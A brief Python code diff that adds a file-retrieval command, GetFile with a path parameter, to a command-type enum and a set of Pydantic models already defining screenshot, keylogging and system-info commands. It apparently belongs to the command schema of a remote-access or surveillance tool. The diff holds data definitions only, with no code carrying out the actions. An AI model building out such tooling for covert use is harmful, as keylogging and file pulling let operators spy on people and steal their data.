@@ -10,6 +10,7 @@ class CommandType(str, enum.Enum):
     Screenshot = "Screenshot"
     KeyLog = "KeyLog"
     GetSystemInfo = "GetSystemInfo"
+    GetFile = "GetFile"
 
 
 class BasicCommand(BaseModel):
@@ -34,3 +35,13 @@ class KeyLogParameters(BaseModel):
 class KeyLogCommand(BasicCommand):
     command_type: CommandType = CommandType.KeyLog
     parameters: KeyLogParameters
+
+
+class GetFileParameters(BaseModel):
+    path: str
+
+
+class GetFileCommand(BasicCommand):
+    command_type: CommandType = CommandType.GetFile
+    parameters: GetFileParameters
+
